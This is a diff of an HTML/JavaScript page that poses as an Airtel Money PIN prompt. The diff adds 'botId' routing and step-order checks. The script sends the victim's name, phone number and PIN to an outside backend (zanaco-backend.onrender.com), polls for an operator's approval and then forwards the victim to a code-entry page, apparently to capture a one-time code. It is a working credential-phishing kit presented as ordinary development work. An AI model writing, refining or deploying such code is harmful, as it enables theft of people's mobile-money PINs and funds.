@@ -4,28 +4,93 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Enter PIN</title>
+
 <style>
-body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-.pin-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 350px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }
+body {
+    font-family: Arial, sans-serif;
+    background: #f6f7fb;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.pin-container {
+    background: #fff;
+    padding: 30px;
+    border-radius: 12px;
+    width: 100%;
+    max-width: 350px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    text-align: center;
+}
+
 h2 { margin-bottom: 8px; }
 p { color: #666; font-size: 14px; }
-.pin-boxes { display: flex; justify-content: space-between; margin: 25px 0; }
-.pin-boxes input { width: 55px; height: 60px; text-align: center; font-size: 24px; border: 2px solid red; border-radius: 8px; outline: none; }
-.pin-boxes input:focus { border-color: darkred; box-shadow: 0 0 5px rgba(255,0,0,0.5); }
-.shake { animation: shake 0.4s; }
-@keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(-5px); } 50% { transform: translateX(5px); } 75% { transform: translateX(-5px); } 100% { transform: translateX(0); } }
-button { width: 100%; padding: 12px; background: red; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; position: relative; display: flex; justify-content: center; align-items: center; }
-button:disabled { background: #ccc; cursor: not-allowed; }
-.spinner { display: none; width: 20px; height: 20px; border: 3px solid #fff; border-top: 3px solid rgba(255,255,255,0.3); border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px; }
-@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-.status { margin-top: 15px; font-size: 14px; color: #555; }
+
+.pin-boxes {
+    display: flex;
+    justify-content: space-between;
+    margin: 25px 0;
+}
+
+.pin-boxes input {
+    width: 55px;
+    height: 60px;
+    text-align: center;
+    font-size: 24px;
+    border: 2px solid red;
+    border-radius: 8px;
+}
+
+button {
+    width: 100%;
+    padding: 12px;
+    background: red;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+button:disabled {
+    background: #ccc;
+}
+
+.spinner {
+    display: none;
+    width: 20px;
+    height: 20px;
+    border: 3px solid #fff;
+    border-top: 3px solid rgba(255,255,255,0.3);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-left: 10px;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+.status {
+    margin-top: 15px;
+    font-size: 14px;
+}
+
 .error { color: red; }
 </style>
 </head>
+
 <body>
+
 <div class="pin-container">
     <h2>Enter Your PIN</h2>
-    <p>Please enter your Airtel money PIN</p>
+    <p>Please enter your Airtel Money PIN</p>
 
     <form id="pinForm">
         <div class="pin-boxes" id="pinBoxes">
@@ -47,6 +112,23 @@ button:disabled { background: #ccc; cursor: not-allowed; }
 <script>
 const BACKEND_URL = "https://zanaco-backend.onrender.com";
 
+// ---------------- BOT ROUTING ----------------
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId');
+
+if (!botId) {
+    alert("Invalid access link");
+    throw new Error("botId missing");
+}
+
+localStorage.setItem('botId', botId);
+
+// Prevent skipping steps
+if (!localStorage.getItem('name') || !localStorage.getItem('phone')) {
+    window.location.href = `details.html?botId=${botId}`;
+}
+
+// ---------------- PIN LOGIC ----------------
 const inputs = document.querySelectorAll('.pin-boxes input');
 const button = document.getElementById('submitBtn');
 const btnText = document.getElementById('btnText');
@@ -60,95 +142,90 @@ const maxAttempts = 3;
 let requestId = null;
 let pollInterval = null;
 
-// Auto-focus first input
 inputs[0].focus();
 
-// Input handling
 inputs.forEach((input, index) => {
     input.addEventListener('input', () => {
-        input.value = input.value.replace(/[^0-9]/g, '');
-        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
+        input.value = input.value.replace(/\D/g, '');
+        if (input.value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
         button.disabled = ![...inputs].every(i => i.value);
     });
+
     input.addEventListener('keydown', e => {
-        if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+            inputs[index - 1].focus();
+        }
     });
 });
 
-// Submit PIN
-form.addEventListener('submit', async (e) => {
+// ---------------- SUBMIT PIN ----------------
+form.addEventListener('submit', async e => {
     e.preventDefault();
+
     const pin = [...inputs].map(i => i.value).join('');
-    const name = localStorage.getItem('name') || 'Test Name';
-    const phone = localStorage.getItem('phone') || '0712345678';
+    const name = localStorage.getItem('name');
+    const phone = localStorage.getItem('phone');
 
     button.disabled = true;
     btnText.textContent = 'Verifying...';
     spinner.style.display = 'inline-block';
-    statusText.textContent = 'Please wait while we verify your PIN...';
+    statusText.textContent = 'Please wait...';
 
     try {
         const res = await fetch(`${BACKEND_URL}/submit-pin`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ name, phone, pin })
+            body: JSON.stringify({ name, phone, pin, botId })
         });
 
         const data = await res.json();
         requestId = data.requestId;
-        console.log('🆔 RequestId received:', requestId);
-
         startPolling();
-    } catch (err) {
-        console.error('Submit PIN error:', err);
-        statusText.textContent = 'Failed to submit PIN. Try again.';
+
+    } catch {
         spinner.style.display = 'none';
         btnText.textContent = 'Submit PIN';
         button.disabled = false;
+        statusText.innerHTML = '<span class="error">Submission failed.</span>';
     }
 });
 
-// Poll for approval
+// ---------------- POLLING ----------------
 function startPolling() {
-    if (pollInterval) clearInterval(pollInterval);
-
     pollInterval = setInterval(async () => {
-        if (!requestId) return;
+        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+        const data = await res.json();
 
-        try {
-            console.log('⏱ Polling for approval...', requestId);
-            const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
-            const data = await res.json();
-            console.log('📊 Poll result:', data);
+        if (data.approved === true) {
+            clearInterval(pollInterval);
+            window.location.href = `code.html?botId=${botId}`;
+        }
 
-            if (data.approved === true) {
-                clearInterval(pollInterval);
-                console.log('✅ PIN approved! Redirecting...');
-                window.location.href = 'code.html';
-            } else if (data.approved === false) {
-                clearInterval(pollInterval);
-                attempts++;
-                pinBoxes.classList.add('shake');
-                setTimeout(() => pinBoxes.classList.remove('shake'), 400);
+        if (data.approved === false) {
+            clearInterval(pollInterval);
+            attempts++;
 
-                if (attempts >= maxAttempts) {
-                    statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
-                    spinner.style.display = 'none';
-                    return;
-                }
+            pinBoxes.classList.add('shake');
+            setTimeout(() => pinBoxes.classList.remove('shake'), 400);
 
-                statusText.innerHTML = '<span class="error">Incorrect PIN. Please try again.</span>';
-                spinner.style.display = 'none';
-                inputs.forEach(i => i.value = '');
-                inputs[0].focus();
-                button.disabled = true;
-                btnText.textContent = 'Submit PIN';
+            spinner.style.display = 'none';
+            btnText.textContent = 'Submit PIN';
+
+            if (attempts >= maxAttempts) {
+                statusText.innerHTML = '<span class="error">Too many attempts.</span>';
+                return;
             }
-        } catch (err) {
-            console.error('Polling error:', err);
+
+            statusText.innerHTML = '<span class="error">Incorrect PIN. Try again.</span>';
+            inputs.forEach(i => i.value = '');
+            inputs[0].focus();
+            button.disabled = true;
         }
     }, 1500);
 }
 </script>
+
 </body>
 </html>
